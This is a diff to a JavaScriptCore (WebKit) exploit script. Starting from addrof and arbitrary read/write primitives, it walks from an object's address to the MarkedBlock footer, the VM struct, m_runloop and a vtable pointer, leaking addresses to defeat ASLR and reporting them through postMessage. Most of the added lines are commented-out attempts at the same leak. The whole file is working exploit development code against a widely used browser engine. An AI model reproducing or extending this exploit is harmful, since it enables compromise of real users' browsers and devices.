@@ -624,24 +624,123 @@ for (var i = 0; i < 1000; ++i) {
     };
     print("we have arbitrary r/w with JSArray :)");
     var bb = {};
-        bb[0] = 1.1
+        //bb[0] = 1.1
         var bbaddr = stage2.addrof(bb);
-        //about to burn a vtable leak method publically RIP
-         print("object address?" + hex1(bbaddr));
-        var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
-        print("JSC::VM Struct @" + hex1(vm));
-        //m_runloop contains a vtable at offset 0...
-        // m_runloop is + 0x18 from JSC::VMStruct!
-        var m_runloop = stage2.read64(vm + 0x18);
-        //hopefully points to JavaScriptCore Base!
-        print("m_runloop @ " + hex1(m_runloop))
+        fuck.port.postMessage("object address @ " + hex1(bbaddr));
+        var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
+        //refer to VM.h this is
+        //JSC::MarkedBlock::footer at 0ffset 8 should be the vm struct
+        fuck.port.postMessage("footeraddr @ " + hex1(footeraddr));
+        var vmstruct = stage2.read64(footeraddr+0x08); 
+        fuck.port.postMessage("vmstruct @ " + hex1(vmstruct));
+        //var structdump = stage2.read(vmstruct,0x30);
+        var m_runloop = stage2.read64(vmstruct+0x10); 
+        //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
+        fuck.port.postMessage("m_runloop @ " + hex1(m_runloop));
+        //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
         var vtable = stage2.read64(m_runloop);
-        //var jscbase = Sub(vtable, new Int64(vtable).lo() & 0xfff);
-        print("vtable @ " + hex1(vtable));
-	var anchor = stage2.read64(vtable);
-	print("anchor @" + hex1(anchor));
-	var hdr = Sub(anchor, new Int64(anchor).lo() & 0xfff);
-	print("header @ " + hdr);
+        fuck.port.postMessage("vtable @ " + hex1(vtable));
+        //stage.passGC();
+        //gc();*/
+        //fuck.port.postMessage(hexdump(stage2.read(vtable,0x100)));
+        //var anchor = stage2.read64(vtable);
+        //fuck.port.postMessage("anchor @ " + hex1(anchor))
+
+
+        //fuck.port.postMessage(hex1(test2));
+        //fuck.port.postMessage(hex1(test3))
+        //var runloop = stage2.read64(vmaddr+0);
+        //var runloop1 = stage2.read64(vmaddr + 8);
+        //var runloop2 = stage2.read64(vmaddr + 0x10);
+        //var runloop3 = stage2.read64(vmaddr + 0x18);
+        //fuck.port.postMessage("runloop @ " + hex1(runloop));
+        //var vtable = stage2.read64(runloop)
+        //fuck.port.postMessage("vtable @ " + hex1(vtable));
+        //fuck.port.postMessage("m_runloop @ " + hex1(m_runloop));
+        //fuck.port.postMessage("vtable @ " + hex1(vtable));
+        /*var vmaddr = stage2.read64(((bbaddr & 0xffffffffffffc000)+(((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130)); //0x130 or 12C?
+        //fuck.port.postMessage("vmaddr @ " + hexdump(stage2.read(((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x12C),0x50)));
+        fuck.port.postMessage("vmstruct @ " + hex1(vmaddr));
+
+        var runloop = stage2.read64(vmaddr+0x18);
+        fuck.port.postMessage("runloop @ " + hex1(runloop));
+        var vtab = stage2.read64(runloop);
+        fuck.port.postMessage("vtab @ " + hex1(vtab))*/
+        /*var vtab = stage2.read64(runloop);
+        var anch
+
+        fuck.port.postMessage("vtab @ " + hex1(vtab))
+        while(true) {
+            if(strcmp(stage2.read(vtab, 0x10), "dyld_v1   arm64")) {
+                break;
+            }
+        //fuck.port.postMessage(String.fromCharCode(...stage2.read(vtab,0x10)));
+        vtab = Sub(vtab , 0x1000)
+        }*/
+        //var dd = stage2.read64(runloop);
+        //fuck.port.postMessage("loop @ " + hex1(dd));
+        /*var vtable = stage2.read64(runloop);
+        fuck.port.postMessage("vtable @ " + hex1(vtable));
+        var anchor = stage2.read64(vtable);
+        fuck.port.postMessage("anchor @ " + hex1(anchor));
+        var hdr = anchor - (anchor & 0xfff);
+        fuck.port.postMessage("hdr @ " + hex1(hdr));
+        var i = 0;
+        while(true) {
+            
+            fuck.port.postMessage(hexdump(stage2.read(hdr,0x10)));
+            i++
+            hdr -= 0x1000
+            if(i == 10) {
+                break;
+            }
+        }*/
+
+        
+        //stage2.write64(hdr,0x41414141);
+
+        /*var vmstruct = stage2.read64(MarkBlockvm);
+        fuck.port.postMessage("vmstruct @ " + hex1(vmstruct))
+        var runloop = stage2.read64(vmstruct+0x18);
+        fuck.port.postMessage("runloop @ " + hex1(runloop));
+        var vtab = stage2.read64(runloop);
+        fuck.port.postMessage("vtab @ " + hex1(vtab))*/
+        /*fuck.port.postMessage("object address?" + hex1(bbaddr));
+        var footeraddr = (bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x128 //should point to footer address
+        fuck.port.postMessage("footeraddress @ " + hex1(footeraddr));
+        var vm = stage2.read64(footeraddr+8); //vm pointer?
+        fuck.port.postMessage("VM Struct @ " + hex1(vm));
+        var runloop = stage2.read64(vm+0x18);
+        fuck.port.postMessage("runloop @ " + hex1(runloop));
+        var vtable = stage2.read64(runloop);
+        fuck.port.postMessage("vtable @ " + hex1(vtable));*/
+        //stage2.write64(vtable,0)
+
+        /*var runloop = stage2.read64(footeraddr); //? right vm struct
+        fuck.port.postMessage("Struct guess #2 @ " + hex1(runloop))
+        var realrunloop = stage2.read64(runloop);
+        var guess2 = stage2.read64(vm+0x18);
+        fuck.port.postMessage("runloop @? " + hex1(realrunloop) + hex1(guess2));
+        var */
+        //var vtab = stage2.read64(guess2)
+        /*function toHexString(byteArray) {
+  return byteArray.reduce((output, elem) => 
+    (output + ('0' + elem.toString(16)).slice(-2)),
+    '');
+}
+        fuck.port.postMessage("vm struct @ " + hex1(toHexString(vm)));
+        var m_runloop = stage2.read64(hex1(toHexString(vm)));
+        fuck.port.postMessage(hex1(m_runloop))*/
+
+        //var m_runloop = stage2.read64(vm+0x18);
+        //fuck.port.postMessage("m_runloop @ " + hex1(m_runloop))
+        //var vtable = stage2.read64(m_runloop);
+        //fuck.port.postMessage("vtable " + hex1(vtable));
+	      
+	      
+	      
+	      
+	      
 	      
 	//print("JSC Base? @ " + jscbase);
 	//print("base dump?" + String.fromCharCode(...stage2.read(jscbase, 0x100)))
